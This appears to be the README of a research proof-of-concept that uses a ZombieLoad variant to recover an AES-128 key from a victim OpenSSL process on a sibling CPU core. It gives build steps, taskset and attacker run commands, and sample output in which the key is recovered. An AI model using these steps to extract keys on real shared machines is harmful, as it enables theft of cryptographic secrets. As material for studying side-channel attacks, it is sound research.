# Attacker Program for Cache Line Fingerprinting with ZomvieLoad Variant 1

The folder `aes-min` contains a minimal AES128 software implementation by Craig McQueen ([cmcqueen/aes-min on GitHub, version 0.3.1](https://github.com/cmcqueen/aes-min/tree/728e156091b95a7f2e8882b7dee012e9a6ea6213) that we use to compute the inverse AES key schedule. We removed some files (like tests) that are not necessary for compiling the victim program and introduced minor changes to make the inverse key schedule function accessible to our own C code (see [aes-min/CHANGES](aes-min/CHANGES) for details). Please refer to the original repository if you are interested in the `aes-min` project.

## Preparing the attacker program

Set the processor id to run the attacker process on in `main.h`:

```c
#define CPU_ATTACKER 3
```

## Compiling
```
make
```

## Launch the attack
Start a victim process and pin it to the sibling core, for example:
```
taskset -c 7 ../victim/bin/victim-openssl inf
```

Start the attacker program. Provide the number of samples to collect as a command line parameter:
```
bin/clfp_attacker_v1 100000
```

If the attack was successful, the attacker program will print the round keys and the initial key:

```
The round key
	4e 54 f7 0e 5f 5f c9 f3 84 a6 4f b2 4e a6 dc 4f 
is from round 7. The key
	3d 80 47 7d 47 16 fe 3e 1e 23 7e 44 6d 7a 88 3b 
occurs 4 rounds before in round 3. Your AES128 key (round key 0) is:
	2b 7e 15 16 28 ae d2 a6 ab f7 15 88 09 cf 4f 3c 
```
